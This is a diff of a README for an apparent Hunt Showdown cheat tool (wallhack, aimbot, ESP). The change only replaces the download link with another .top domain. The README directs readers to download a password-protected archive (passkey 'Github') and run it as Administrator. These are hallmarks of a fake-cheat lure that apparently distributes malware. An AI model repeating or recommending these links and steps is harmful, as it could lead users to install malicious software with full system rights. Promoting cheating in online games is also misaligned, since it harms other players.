@@ -6,7 +6,7 @@ Hunt Showdown hack with wallhack, aimbot, ESP, no-recoil, and more. For educatio
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -69,7 +69,7 @@ Based on popular mods like **Hunt AIO**, **Hunt Cheat**, and **CryEngine ESP**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Hunt Showdown.
 4. Run the hack **as Administrator**.
